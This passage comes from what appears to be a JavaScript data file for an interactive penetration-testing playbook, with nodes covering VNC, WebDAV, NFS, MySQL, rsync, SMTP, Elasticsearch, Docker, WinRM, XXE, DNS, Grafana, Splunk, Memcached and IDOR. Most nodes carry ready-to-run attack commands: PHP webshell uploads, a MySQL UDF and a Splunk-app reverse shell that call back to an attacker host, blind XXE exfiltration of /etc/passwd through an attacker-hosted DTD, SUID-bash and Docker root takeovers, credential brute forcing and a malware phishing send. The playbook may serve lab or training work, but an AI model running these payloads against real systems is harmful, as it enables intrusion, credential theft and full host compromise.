    cmd: `nmap -p 5900-5906 -sV --script vnc-info,vnc-brute $ip

# Check for no-auth (Security Type 1 = None)
vncviewer $ip:5900   # try without password first

# Common VNC passwords
# password  12345678  vnc123  admin  (blank)

# Brute force
hydra -P /usr/share/wordlists/rockyou.txt vnc://$ip
medusa -h $ip -u "" -P passwords.txt -M vnc

# If you have file access — decrypt stored VNC password
# Location: ~/.vnc/passwd  C:\\Users\\user\\.vnc\\passwd
python3 -c "
import subprocess
with open('.vnc/passwd','rb') as f: data=f.read()
key=[23,82,107,6,35,78,88,7]
from itertools import islice
import struct
def decrypt(data,key):
    result=[]
    for i,b in enumerate(data[:8]):
        k=key[i%8]
        result.append(b^k)
    return bytes(result)
print(decrypt(data,key))
"

# Once connected — get shell via VNC
# Open terminal in VNC session then use standard shells`,
    warn: null,
    choices: [
      { label: "No auth — instant desktop access", next: "shell_upgrade" },
      { label: "Cracked password — got desktop access", next: "shell_upgrade" },
      { label: "Found passwd file — decrypted VNC creds", next: "creds_found" },
    ],
  },

  webdav: {
    phase: "WEB",
    title: "WebDAV",
    body: "WebDAV over HTTP/HTTPS lets you upload files via PUT. If PUT is enabled and you can write to the webroot, you have a shell. Test methods first.",
    cmd: `nmap -p 80,443 --script http-webdav-scan,http-methods $ip
curl -X OPTIONS http://$ip/webdav/ -v   # Look for PUT in Allow header

davtest -url http://$ip/webdav/
davtest -url http://$ip/webdav/ -auth user:pass

# Direct PUT upload
curl -X PUT http://$ip/webdav/shell.php \\
  -u user:pass \\
  -d '<?php system($_GET["cmd"]); ?>'

# Upload as .txt then MOVE to .php (extension bypass)
curl -X PUT http://$ip/webdav/shell.txt -u user:pass \\
  -d '<?php system($_GET["cmd"]); ?>'
curl -X MOVE http://$ip/webdav/shell.txt \\
  -u user:pass -H "Destination: http://$ip/webdav/shell.php"

# ASPX for IIS
curl -X PUT http://$ip/webdav/shell.aspx -u user:pass \\
  --data-binary @shell.aspx

# Common paths
# /webdav/  /dav/  /WebDAV/  /uploads/  /_vti_bin/

# List contents
cadaver http://$ip/webdav/
# dav> ls  put shell.php  get file.txt`,
    warn: "Check if the upload directory is web-accessible — WebDAV root may not be under webroot.",
    choices: [
      { label: "PUT enabled — uploaded shell", next: "reverse_shell" },
      { label: "MOVE bypass worked — got RCE", next: "reverse_shell" },
      { label: "Need creds — try default WebDAV creds", next: "bruteforce" },
    ],
  },

  nfs_enum: {
    phase: "RECON",
    title: "NFS (2049)",
    body: "NFS shares expose the filesystem. no_root_squash = instant root. Mount the share, check UIDs, look for SSH keys and credentials.",
    cmd: `nmap -p 2049,111 --script nfs-ls,nfs-showmount,nfs-statfs $ip
showmount -e $ip
rpcinfo -p $ip | grep nfs

# Mount the share
mkdir /mnt/nfs
mount -t nfs $ip:/share /mnt/nfs -o nolock
ls -la /mnt/nfs

# Find interesting files
find /mnt/nfs -name "*.key" -o -name "*.pem" -o -name "id_rsa" 2>/dev/null
find /mnt/nfs -name "*password*" -o -name ".env" 2>/dev/null
grep -r "password\\|secret\\|key" /mnt/nfs 2>/dev/null

# Check file ownership UIDs
ls -lan /mnt/nfs   # numeric UIDs — match them locally

# no_root_squash exploit — run as root on Kali
cp /bin/bash /mnt/nfs/rootbash
chmod +s /mnt/nfs/rootbash
# On target: /path/to/rootbash -p

# UID manipulation — match file owner
useradd -u 1000 fakeuser && su fakeuser

# Write SSH key if home dir is exported
mkdir -p /mnt/nfs/root/.ssh
cp ~/.ssh/id_rsa.pub /mnt/nfs/root/.ssh/authorized_keys
chmod 600 /mnt/nfs/root/.ssh/authorized_keys
ssh root@$ip`,
    warn: "Always check if no_root_squash is set — showmount output shows (everyone) vs (ro,root_squash).",
    choices: [
      { label: "no_root_squash — SUID bash = root", next: "got_root_linux" },
      { label: "Wrote SSH key — shell as root", next: "got_root_linux" },
      { label: "Found credentials in share", next: "creds_found" },
      { label: "Found SSH key", next: "ssh_key" },
    ],
  },

  mysql: {
    phase: "RECON",
    title: "MySQL (3306)",
    body: "MySQL with FILE privilege = read/write OS files. INTO OUTFILE drops a webshell. UDF gives full RCE. Root with no password is common on dev boxes.",
    cmd: `nmap -p 3306 -sV --script mysql-info,mysql-empty-password $ip
mysql -u root -h $ip           # no password
mysql -u root -h $ip -p        # try: root, password, mysql, toor

# Default creds: root:(blank)  root:root  root:password

# Enumerate once connected
SHOW DATABASES; USE <db>; SHOW TABLES;
SELECT user,host,authentication_string FROM mysql.user;
SHOW VARIABLES LIKE 'secure_file_priv';  # empty = no restriction
SHOW VARIABLES LIKE 'plugin_dir';

# Read files (needs FILE priv)
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');

# Write webshell (needs FILE priv + webroot write)
SELECT '<?php system($_GET["cmd"]); ?>'
  INTO OUTFILE '/var/www/html/shell.php';

# UDF RCE (MySQL running as root)
# searchsploit mysql udf — compile raptor_udf2.c
SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';
CREATE FUNCTION do_system RETURNS integer SONAME 'raptor_udf2.so';
SELECT do_system('bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1');

# Brute force
hydra -l root -P rockyou.txt $ip mysql`,
    warn: "secure_file_priv restricts INTO OUTFILE. If set to a specific path, you can only write there.",
    choices: [
      { label: "INTO OUTFILE webshell — got RCE", next: "reverse_shell" },
      { label: "UDF RCE worked — got shell", next: "shell_upgrade" },
      { label: "Dumped creds from DB", next: "creds_found" },
      { label: "Read sensitive config file", next: "creds_found" },
    ],
  },

  rsync: {
    phase: "RECON",
    title: "Rsync (873)",
    body: "Rsync modules are directory shares. Anonymous read = file loot. Anonymous write = upload SSH keys or webshells. Enumerate modules first.",
    cmd: `nmap -p 873 -sV --script rsync-list-modules $ip
nc -nv $ip 873     # banner grab

# List modules (anonymous)
rsync rsync://$ip/
rsync rsync://$ip/<module>/

# Download entire module
rsync -av rsync://$ip/<module>/ /tmp/rsync_loot/

# With credentials
rsync -av rsync://user:pass@$ip/<module>/ /tmp/loot/

# Search for useful files
find /tmp/rsync_loot -name "id_rsa" -o -name "*.key" -o -name ".env"
find /tmp/rsync_loot -name "*.conf" | xargs grep -i "pass\\|secret"

# Upload SSH key (if writable)
rsync ~/.ssh/id_rsa.pub rsync://$ip/<module>/.ssh/authorized_keys

# Upload webshell (if module under webroot)
rsync shell.php rsync://$ip/<module>/shell.php`,
    warn: "Module names are case-sensitive. Try common names: backup, data, files, web, www, home, root.",
    choices: [
      { label: "Anonymous read — found credentials", next: "creds_found" },
      { label: "Found SSH key in module", next: "ssh_key" },
      { label: "Wrote SSH key — got shell", next: "got_root_linux" },
      { label: "Wrote webshell", next: "reverse_shell" },
    ],
  },

  smtp_enum: {
    phase: "RECON",
    title: "SMTP (25/465/587)",
    body: "SMTP leaks usernames via VRFY/EXPN/RCPT. Valid users feed your spray lists. Open relay lets you send phishing emails internally.",
    cmd: `nmap -p 25,465,587 --script smtp-commands,smtp-enum-users,smtp-ntlm-info $ip

# Banner grab
nc $ip 25
telnet $ip 25

# VRFY — user enumeration (most common)
telnet $ip 25
EHLO test
VRFY root
VRFY admin
VRFY www-data

# EXPN — expand mailing lists
EXPN admins
EXPN all

# RCPT TO — enumerate valid users
MAIL FROM:<test@test.com>
RCPT TO:<admin@$DOMAIN>   # 250=exists  550=not found

# Automated user enum
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t $ip
smtp-user-enum -M RCPT -U users.txt -t $ip -f sender@test.com

# Open relay test
telnet $ip 25
EHLO test
MAIL FROM:<attacker@evil.com>
RCPT TO:<victim@external.com>   # 250 = open relay

# Send phishing if open relay (client-side attacks)
swaks --to victim@$DOMAIN --from "it@$DOMAIN" \\
  --server $ip --attach malware.hta`,
    warn: "VRFY and EXPN are often disabled on hardened servers. RCPT TO is less likely to be blocked.",
    choices: [
      { label: "Enumerated valid users — spray them", next: "ad_spray" },
      { label: "Open relay — send phishing for client-side", next: "client_side" },
      { label: "Found NTLM info — extract domain info", next: "ad_start" },
    ],
  },

  elasticsearch: {
    phase: "RECON",
    title: "Elasticsearch (9200/9300)",
    body: "Elasticsearch REST API is unauthenticated by default in older versions. All data is JSON and browsable. Dump everything — it often holds app credentials and PII.",
    cmd: `nmap -p 9200,9300 -sV $ip
curl -s http://$ip:9200/          # cluster info + version
curl -s http://$ip:9200/_cat/indices?v  # list all indices
curl -s http://$ip:9200/_cat/nodes?v    # node info

# Browse indices
curl -s http://$ip:9200/<index>/_search?pretty
curl -s http://$ip:9200/<index>/_search?q=password&pretty
curl -s "http://$ip:9200/_all/_search?q=password&pretty&size=100"

# Dump all data
curl -s http://$ip:9200/<index>/_search?size=10000 | jq .

# Cluster settings
curl -s http://$ip:9200/_cluster/settings
curl -s http://$ip:9200/_nodes

# Search for credentials
curl -s "http://$ip:9200/_all/_search?q=password+OR+passwd+OR+secret&pretty"

# Write to index (if writable — can inject data)
curl -X POST http://$ip:9200/test/_doc/1 \\
  -H "Content-Type: application/json" \\
  -d '{"cmd":"id"}'

# Check for Kibana on 5601
curl -s http://$ip:5601/api/status`,
    warn: "Elasticsearch 8.x has security enabled by default. Older versions (6.x, 7.x) are often unauthenticated.",
    choices: [
      { label: "Found credentials in indices", next: "creds_found" },
      { label: "Kibana accessible on 5601", next: "web_enum" },
      { label: "Nothing useful — check other ports", next: "research_unknown" },
    ],
  },

  docker_api: {
    phase: "RECON",
    title: "Docker API (2375/2376)",
    body: "Exposed Docker API = instant root on the host. Mount the host filesystem into a privileged container. No password needed on port 2375.",
    cmd: `nmap -p 2375,2376 -sV $ip
curl -s http://$ip:2375/containers/json   # if returns data = unauthenticated
curl -s http://$ip:2375/version

# List containers and images
export DOCKER_HOST="tcp://$ip:2375"
docker ps -a
docker images

# Instant root — mount host filesystem
docker -H tcp://$ip:2375 run -it --rm \\
  --privileged -v /:/mnt alpine chroot /mnt sh

# Read /etc/shadow
docker -H tcp://$ip:2375 run --rm \\
  -v /etc:/mnt/etc alpine cat /mnt/etc/shadow

# Write SSH key to host root
docker -H tcp://$ip:2375 run --rm \\
  -v /root/.ssh:/mnt/.ssh alpine sh -c \\
  "echo 'ssh-rsa YOURKEY' >> /mnt/.ssh/authorized_keys"

# Container escape if already inside container
# Check if privileged: cat /proc/self/status | grep CapEff
# Check for docker socket: ls -la /var/run/docker.sock
docker run -v /:/mnt --rm -it alpine chroot /mnt sh`,
    warn: "Port 2375 = unauthenticated. Port 2376 = TLS. If docker.sock is mounted inside a container you're already in, you can escape to host.",
    choices: [
      { label: "Mounted host FS — got root on host", next: "got_root_linux" },
      { label: "Inside container with docker.sock", next: "got_root_linux" },
      { label: "Found creds in container env vars", next: "creds_found" },
    ],
  },

  winrm_access: {
    phase: "WINDOWS",
    title: "WinRM (5985/5986)",
    body: "WinRM is evil-winrm's playground. If you have creds or an NTLM hash for a user in the Remote Management Users group, you have a shell.",
    cmd: `nmap -p 5985,5986 -sV $ip
curl -s http://$ip:5985/wsman   # 200 = WinRM accessible

# evil-winrm — primary tool
evil-winrm -i $ip -u administrator -p 'password'
evil-winrm -i $ip -u 'DOMAIN\\user' -p 'password'
evil-winrm -i $ip -u administrator -H <NTLM_HASH>
evil-winrm -i $ip -u administrator -p 'password' -S  # SSL/5986

# Upload/download files in evil-winrm session
upload /path/to/tool.exe C:\\Windows\\Temp\\tool.exe
download C:\\Users\\admin\\Desktop\\proof.txt

# crackmapexec to test creds
crackmapexec winrm $ip -u user -p 'password'
crackmapexec winrm $ip -u users.txt -p passwords.txt
crackmapexec winrm $ip -u user -H <HASH>

# PowerShell remoting (from Windows)
$sess = New-PSSession -ComputerName $ip -Credential (Get-Credential)
Enter-PSSession $sess`,
    warn: "User must be in 'Remote Management Users' or 'Administrators' group. WinRM is usually enabled on domain-joined machines.",
    choices: [
      { label: "Got WinRM shell — start privesc", next: "windows_post_exploit" },
      { label: "Need creds first", next: "bruteforce" },
      { label: "Have hash — Pass the Hash", next: "pth" },
    ],
  },

  xxe: {
    phase: "WEB",
    title: "XXE — XML External Entity Injection",
    body: "XXE happens when an XML parser processes external entity references in user-supplied XML. Two modes: direct (file contents returned in the response) and blind (no output, need out-of-band exfil). Any endpoint that accepts XML is in scope — including file uploads of SVG, DOCX, XLSX (all XML internally). The progression: detect → read local files → pivot to SSRF → blind exfil if output is filtered.",
    cmd: `# ── STEP 1: FIND XML ENDPOINTS ───────────
# Look for these Content-Type headers:
#   application/xml, text/xml, application/soap+xml
# File uploads that accept: .xml, .svg, .docx, .xlsx
# API endpoints with XML bodies
# SOAP web services

# Intercept a normal request in Burp — change Content-Type to application/xml
# Add a simple XXE payload — if app parses it, you have XXE

# ── STEP 2: BASIC FILE READ ───────────────
# Direct output — file contents returned in response body
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>

# Windows equivalent:
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
<root><data>&xxe;</data></root>

# High-value Linux reads:
# file:///etc/passwd          → users
# file:///etc/shadow          → hashes (needs root)
# file:///etc/hosts           → internal hostnames
# file:///home/user/.ssh/id_rsa   → SSH private key
# file:///var/www/html/.env   → app secrets
# file:///proc/self/environ   → env vars including secrets
# file:///proc/self/cmdline   → running process info

# High-value Windows reads:
# file:///C:/Windows/win.ini
# file:///C:/inetpub/wwwroot/web.config
# file:///C:/Windows/System32/inetsrv/config/applicationHost.config

# ── STEP 3: PHP WRAPPER (bypass filters) ──
# If file contents break XML parsing (special chars), base64-encode them
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root><data>&xxe;</data></root>
# Decode the output: echo "BASE64OUTPUT" | base64 -d

# Read source code of the app:
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
]>
<root><data>&xxe;</data></root>

# ── STEP 4: SSRF VIA XXE ──────────────────
# Make the server issue HTTP requests
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://$LHOST/"> ]>
<root><data>&xxe;</data></root>
# Listen: nc -nlvp 80

# Internal network probing
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<root><data>&xxe;</data></root>

<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1:6379/"> ]>
<root><data>&xxe;</data></root>

# ── STEP 5: BLIND XXE — OOB DETECTION ────
# No output in response — detect via DNS callback
interactsh-client    # note your *.oast.fun domain

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://YOUR.oast.fun/detect">
  %xxe;
]>
<root/>

# ── STEP 6: BLIND XXE — DATA EXFIL ───────
# Host evil.dtd on your attack box (python3 -m http.server 80)
# evil.dtd content (save as /tmp/evil.dtd on Kali):
# <!ENTITY % file SYSTEM "file:///etc/passwd">
# <!ENTITY % wrap "<!ENTITY &#37; send SYSTEM 'http://$LHOST/?d=%file;'>">
# %wrap;
# %send;

# Payload to send to the app:
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://$LHOST/evil.dtd">
  %dtd;
]>
<root/>
# File contents arrive at your HTTP server URL-encoded in ?d= parameter

# ── STEP 7: SVG XXE (file upload) ─────────
# Upload this as a .svg file if the app accepts SVGs
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>

# ── STEP 8: DOCX / XLSX XXE ───────────────
# Unzip a .docx file, inject XXE into word/document.xml, rezip and upload
mkdir /tmp/docx_xxe && cd /tmp/docx_xxe
cp /tmp/template.docx . && unzip template.docx
# Edit word/document.xml — add entity declaration and reference
# Rezip: zip -r malicious.docx .`,
    warn: "If file contents break the XML parser (contain <, >, &), use php://filter/convert.base64-encode to avoid encoding issues — always prefer this wrapper for PHP apps. Blind XXE requires your attack server to be reachable from the target — confirm with a basic HTTP ping first before building the exfil chain. Some parsers disable external entities by default (libxml2 with LIBXML_NOENT not set) — if nothing works, try the SVG upload path which often uses a different parser configuration.",
    choices: [
      { label: "File read working — got /etc/passwd", next: "lfi" },
      { label: "PHP source read — found credentials", next: "creds_found" },
      { label: "SSRF via XXE — internal services", next: "ssrf" },
      { label: "SSH key read — log in directly", next: "ssh_key" },
      { label: "Blind XXE confirmed — exfil via DTD", next: "web_fuzz_deep" },
    ],
  },

  dns_enum: {
    phase: "RECON",
    title: "DNS (53)",
    body: "DNS zone transfers dump the entire domain map — every host, IP, subdomain. Even without zone transfer, brute-forcing reveals hidden internal hosts to pivot to.",
    cmd: `nmap -p 53 -sV --script dns-zone-transfer $ip
nmap -p 53 --script dns-brute --script-args dns-brute.domain=target.com $ip

# Zone transfer — often misconfigured on internal DNS
dig axfr target.com @$ip
dig axfr @$ip target.com
host -l target.com $ip
dnsrecon -d target.com -t axfr

# Standard enumeration
dig @$ip target.com any        # All records
dig @$ip target.com ns         # Name servers
dig @$ip target.com mx         # Mail servers
dig @$ip target.com txt        # TXT/SPF records (username hints)
nslookup -type=any target.com $ip

# Subdomain brute force
dnsrecon -d target.com -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
gobuster dns -d target.com -r $ip -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Reverse DNS (find hosts on subnet)
dnsrecon -r 192.168.1.0/24 -n $ip
for i in $(seq 1 254); do host 192.168.1.$i $ip 2>/dev/null | grep "domain name"; done

# Add discovered hosts to /etc/hosts
echo "$ip hostname.target.com" >> /etc/hosts`,
    warn: "Zone transfer (AXFR) works when DNS server is misconfigured to allow any client. Common on internal networks. Always try it — it takes one command.",
    choices: [
      { label: "Zone transfer worked — full host list", next: "targeted_scan" },
      { label: "Found subdomains — add to /etc/hosts", next: "web_enum" },
      { label: "Found internal hostnames — pivot target", next: "pivot_start" },
    ],
  },

  grafana: {
    phase: "WEB",
    title: "Grafana (3000)",
    body: "Grafana shows up constantly on practice machines. CVE-2021-43798 is unauthenticated path traversal — grab the database and extract admin credentials from it.",
    cmd: `nmap -p 3000 -sV $ip
curl -s http://$ip:3000/api/health    # Version info
curl -s http://$ip:3000/login         # Check version on login page

# CVE-2021-43798 — Path Traversal (Grafana < 8.3.0)
# Read Grafana SQLite database (contains hashed passwords)
curl --path-as-is -s "http://$ip:3000/public/plugins/alertlist/../../../../../../../../../var/lib/grafana/grafana.db" -o grafana.db

# Or other plugins: dashboard, graph, table, text, stat, gauge
curl --path-as-is "http://$ip:3000/public/plugins/graph/../../../../../../../../../etc/passwd"

# Extract credentials from grabbed database
sqlite3 grafana.db "SELECT login,password FROM user;"
# Passwords are bcrypt hashed
hashcat -m 3200 grafana_hashes.txt rockyou.txt
john --format=bcrypt grafana_hashes.txt --wordlist=rockyou.txt

# Default creds (try before exploit)
# admin:admin  admin:password  admin:grafana

# After login — data source exploitation
# Go to: Configuration > Data Sources
# Check for database credentials stored in data sources
# MySQL, PostgreSQL, MSSQL connections = creds for lateral movement

# Grafana API enumeration (if you have creds)
curl -u admin:password http://$ip:3000/api/datasources
curl -u admin:password http://$ip:3000/api/users`,
    warn: "CVE-2021-43798 works on plugins that are installed. If alertlist fails try: dashboard, graph, table, text, stat, gauge, barchart, timeseries.",
    choices: [
      { label: "Path traversal worked — got DB / creds", next: "creds_found" },
      { label: "Logged in — found data source creds", next: "creds_found" },
      { label: "Default creds worked", next: "creds_found" },
    ],
  },

  splunkd: {
    phase: "WEB",
    title: "Splunkd (8089/8000)",
    body: "Splunk = instant RCE if you have admin creds. Create a malicious app (Python script in a .tar.gz) and upload via the package manager. Port 8089 is the API, 8000 is the web UI.",
    cmd: `nmap -p 8000,8089 -sV $ip
curl -k https://$ip:8089/services      # API info
curl -k -u admin:changeme https://$ip:8089/services/server/info  # Version

# Default creds: admin:changeme  admin:password  admin:admin

# CVE-2023-46214 — XSLT injection (Splunk < 9.1.2) — check version

# RCE via malicious Splunk app (requires admin)
# Create the app structure:
mkdir -p splunk_shell/bin
cat > splunk_shell/bin/run.py << 'PYEOF'
import sys,socket,os,pty
s=socket.socket()
s.connect(("LHOST",LPORT))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/bash")
PYEOF

cat > splunk_shell/default/inputs.conf << 'CONFEOF'
[script://./bin/run.py]
disabled = false
interval = 10
sourcetype = test
CONFEOF

tar -czf splunk_shell.tar.gz splunk_shell/

# Upload via web UI: Apps > Manage Apps > Install app from file
# OR via API:
curl -k -u admin:changeme https://$ip:8089/services/apps/local \
  -F "name=splunk_shell" \
  -F "filename=true" \
  -F "appfile=@splunk_shell.tar.gz"

# Brute force Splunk login
hydra -l admin -P rockyou.txt $ip http-post-form \
  "/en-US/account/login:username=^USER^&password=^PASS^&return_to=%2Fen-US%2F:Invalid"`,
    warn: "On Windows, Splunk runs as SYSTEM by default — instant privilege escalation. On Linux, check the splunk user's sudo rights.",
    choices: [
      { label: "Got admin — uploaded malicious app = shell", next: "shell_upgrade" },
      { label: "Brute forced creds", next: "creds_found" },
      { label: "Need to escalate — Splunk runs as SYSTEM", next: "got_root_windows" },
    ],
  },

  memcached: {
    phase: "RECON",
    title: "Memcached (11211)",
    body: "Memcached has no authentication. Dump all keys and values — it caches session tokens, credentials, and application data in plaintext.",
    cmd: `nmap -p 11211 -sV --script memcached-info $ip
nc -vn $ip 11211

# Dump all cached data
# Step 1: Get slab IDs
echo "stats slabs" | nc -q 1 $ip 11211

# Step 2: Get keys from each slab (replace N with slab number)
echo "stats cachedump N 0" | nc -q 1 $ip 11211

# Step 3: Get value for each key
echo "get <keyname>" | nc -q 1 $ip 11211

# Automated dump script
python3 -c "
import socket
s = socket.socket()
s.connect(('$ip', 11211))
s.send(b'stats slabs\r\n')
slabs = s.recv(4096).decode()
print('SLABS:', slabs[:500])
s.send(b'stats cachedump 1 0\r\n')
keys = s.recv(4096).decode()
print('KEYS:', keys)
for line in keys.split('\n'):
    if line.startswith('ITEM'):
        key = line.split()[1]
        s.send(f'get {key}\r\n'.encode())
        print(s.recv(4096).decode())
s.close()
"

# Quick version/stats
echo "version" | nc -q 1 $ip 11211
echo "stats" | nc -q 1 $ip 11211`,
    warn: "Memcached data is application-specific. Look for session tokens (can be used for auth bypass), user objects, and any serialized data.",
    choices: [
      { label: "Found session tokens / creds in cache", next: "creds_found" },
      { label: "Found serialized objects — check for deserialization", next: "web_fuzz_deep" },
      { label: "Nothing useful", next: "research_unknown" },
    ],
  },

  idor: {
    phase: "WEB",
    title: "IDOR — Insecure Direct Object Reference",
    body: "IDOR is an access control failure — the app uses a user-supplied reference (ID, filename, GUID) to fetch data without verifying the requesting user owns it. Two escalation paths: horizontal (access another user's data at same privilege level) and vertical (access admin-level data/functions). Always register an account and map your own ID first — then probe adjacent IDs and admin endpoints. Mass assignment is IDOR's sibling — if the API accepts extra fields in POST bodies, add privileged ones.",
    cmd: `# ── STEP 1: MAP YOUR OWN REFERENCES ─────
# After logging in — identify every place your user ID appears
# Register account, note what ID you were assigned
# Intercept requests in Burp — find numeric IDs, UUIDs, filenames

# Where to look:
# URL path:    /user/123/profile   /api/orders/456/invoice
# URL param:   ?id=123  ?user_id=123  ?doc=456
# POST body:   {"user_id":123,"account_id":456}
# Cookies:     user_id=123  account=base64encoded  (decode them)
# Headers:     X-User-ID: 123  X-Account: 456
# API response fields that reference other objects

# ── STEP 2: HORIZONTAL IDOR ──────────────
# Access another user's data at the same privilege level
# Your ID = 124 → try adjacent IDs
curl -H "Cookie: session=YOURSESSION" http://$ip/api/user/123
curl -H "Cookie: session=YOURSESSION" http://$ip/api/user/1
curl -H "Cookie: session=YOURSESSION" http://$ip/api/user/0
curl -H "Cookie: session=YOURSESSION" http://$ip/api/orders/1
curl -H "Cookie: session=YOURSESSION" http://$ip/api/messages/1

# POST body ID swap:
curl -H "Cookie: session=YOURSESSION" \\
  -X POST http://$ip/api/profile/view \\
  -H "Content-Type: application/json" \\
  -d '{"user_id":1}'

# ── STEP 3: VERTICAL IDOR ────────────────
# Access admin-level endpoints with your low-priv session
# Guess admin endpoints from JS source code:
curl -s http://$ip/ | grep -oP '["'"'"'][/a-zA-Z0-9_-]+["'"'"']' | sort -u
# Look for: /admin, /api/admin, /dashboard/admin, /manage, /config

# Try admin endpoints directly with your session:
curl -H "Cookie: session=YOURSESSION" http://$ip/admin/
curl -H "Cookie: session=YOURSESSION" http://$ip/api/admin/users
curl -H "Cookie: session=YOURSESSION" http://$ip/api/admin/config

# ── STEP 4: MASS ASSIGNMENT ───────────────
# If POST/PUT accepts JSON — add privileged fields the UI doesn't expose
# Registration endpoint:
curl -X POST http://$ip/api/register \\
  -H "Content-Type: application/json" \\
  -d '{"username":"attacker","password":"pass","email":"x@x.com","role":"admin","is_admin":true,"admin":1}'

# Profile update endpoint — add role/admin fields:
curl -H "Cookie: session=YOURSESSION" \\
  -X PUT http://$ip/api/profile \\
  -H "Content-Type: application/json" \\
  -d '{"name":"attacker","email":"x@x.com","role":"admin","is_admin":true}'

# ── STEP 5: UUID / GUID TARGETS ──────────
# Apps use UUIDs to prevent sequential guessing — but UUIDs leak from:
#   API responses (other users' IDs in public endpoints)
#   Email links, profile pages, comments
#   Verbose error messages

# Try known-format GUIDs:
curl -H "Cookie: session=YOURSESSION" \\
  http://$ip/api/user/00000000-0000-0000-0000-000000000001

# ── STEP 6: BURP INTRUDER AUTOMATION ─────
# Intruder → Sniper mode on the ID parameter
# Payload: numbers 1–1000 (or 1–100 for speed)
# Grep match: admin, password, email, sensitive keywords
# Flag responses with different length than baseline

# ── STEP 7: INDIRECT OBJECT REFERENCES ───
# File download endpoints are often LFI in disguise
# /download?file=invoice_124.pdf → try ../../../etc/passwd
# /api/attachment?id=456 → try id=1 (admin attachment)
# /export?report=monthly → try report=../config`,
    warn: "Check the JS source for hidden API endpoints — apps often have admin routes that are UI-hidden but not server-enforced. Read every field in API responses: IDs of other objects (order_id, assigned_user, created_by) are all IDOR targets. Mass assignment works best on registration endpoints — if you can set role=admin at signup, the app may never check it again. IDOR in file download params often bleeds directly into LFI — test both.",
    choices: [
      { label: "Got admin access via IDOR/vertical escalation", next: "file_upload" },
      { label: "Mass assignment — registered as admin", next: "file_upload" },
      { label: "IDOR gave credentials / sensitive data", next: "creds_found" },
      { label: "File reference IDOR — escalate to LFI", next: "lfi" },
      { label: "Found hidden admin endpoints in JS", next: "web_enum" },
    ],
  },

  full_portscan: {
    phase: "RECON",
    title: "Full TCP Scan",
    body: "cd into your scans directory first — all output files write to the current directory. Run all 65535 ports in the background while you start UDP in parallel. Never skip this — services on high ports get people caught out.",
    cmd: `# ── SETUP ────────────────────────────────
mkdir -p ~/scans && cd ~/scans
# All scan output writes to current dir — stay here for the engagement

# Full TCP (background it)
nmap -p- --min-rate 5000 -T4 --open --reason $ip -oN allports.txt
# --open   → only show open ports (filters open|filtered noise)
# --reason → shows WHY nmap thinks port is open (syn-ack, etc.)

# UDP top 20 (background)
sudo nmap -sU --top-ports 20 --reason $ip -oN udp.txt &

# HTTP methods check while you wait
nmap -p80,443 --script=http-methods $ip \\
  --script-args http-methods.url-path='/'`,
    warn: null,
    choices: [
      { label: "Scan complete — run targeted scan on open ports", next: "targeted_scan" },
    ],
  },

  targeted_scan: {
    phase: "RECON",
    title: "Targeted Service Scan",
    body: "Run scripts and version detection only on discovered ports. This is your core recon. Read every line of output.",
    cmd: `# ── GREP OPEN PORTS FROM ALLPORTS SCAN ───
# Pull port numbers directly from allports.txt — paste straight into targeted scan
grep -oP '^[0-9]+(?=/tcp\s+open)' allports.txt | tr '\n' ',' | sed 's/,$//'
# Output: 22,80,443,8080  ← copy this

# One-liner: run targeted scan immediately after full scan
ports=$(grep -oP '^[0-9]+(?=/tcp\s+open)' allports.txt | tr '\n' ',' | sed 's/,$//') && \\
  nmap -p$ports -sC -sV -O --reason $ip -oN targeted.txt

# ── TARGETED SCAN ─────────────────────────
nmap -p <PORTS> -sC -sV -O --reason $ip -oN targeted.txt

# ── SEARCHSPLOIT EVERY VERSION IN ONE SHOT ──
# Once targeted.txt is done — pipe nmap output directly into searchsploit
# This hits every service version nmap detected in a single command:
cat targeted.txt | grep "open" | awk '{print $4,$5}' | cut -d/ -f1 | \\
  while read service; do echo "=== $service ==="; searchsploit $service 2>/dev/null | grep -v "No Results"; done

# Or: searchsploit directly against the nmap XML output (cleanest method):
nmap -p <PORTS> -sC -sV -O --reason $ip -oX targeted.xml -oN targeted.txt
searchsploit --nmap targeted.xml
# --nmap reads the XML and searches every detected service/version automatically
# This is the OffSec-recommended workflow for initial exploit discovery`,
    warn: null,
    choices: [
      { label: "Help me read and prioritize this output", next: "analyze_output" },
      { label: "Got a version number — searchsploit it now", next: "searchsploit_web" },
      { label: "Web (80 / 443 / 8080 / 8443)", next: "web_enum" },
      { label: "SMB (139 / 445)", next: "smb_enum" },
      { label: "FTP (21)", next: "ftp_enum" },
      { label: "SSH only (22)", next: "ssh_only" },
      { label: "RDP (3389)", next: "rdp" },
      { label: "WinRM (5985 / 5986)", next: "winrm_access" },
      { label: "SNMP / DNS / LDAP / RPC", next: "other_services" },
      { label: "Active Directory environment", next: "ad_nocreds" },
      { label: "Unknown service / unusual port", next: "research_unknown" },
      { label: "Multiple internal subnets visible", next: "pivot_start" },
    ],
  },


